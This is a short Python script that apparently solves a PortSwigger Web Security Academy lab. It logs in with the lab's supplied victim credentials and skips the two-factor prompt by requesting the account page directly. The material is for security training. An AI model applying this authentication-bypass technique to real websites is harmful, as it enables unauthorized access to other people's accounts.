#!/usr/bin/env python


'''This lab's two-factor authentication can be bypassed. You have already obtained a valid username and password, but do not have access to the user's 2FA verification code. To solve the lab, access Carlos's account page.

Your credentials: wiener:peter
Victim's credentials carlos:montoya

Lab link: https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-simple-bypass
'''

import requests

s = requests.session()

lab_id = '0a1800f60373e815823f42ea00eb005b' #change based on generated lab
uri = f"https://{lab_id}.web-security-academy.net/login" 

# Login as carlos
data = { 'username': 'carlos', 'password': 'montoya'}
r1 = s.post(uri, data=data)
if 'security code' in r1.text:
    # Site is prompting for 2fa, but we don't have to do this to access authed portions of the site. So go to carlos's account page
    uri = f"https://{lab_id}.web-security-academy.net/my-account"
    r2 = s.get(uri)
    if 'solved' in r2.text:
        print('solved')
    else:
        print('nope')
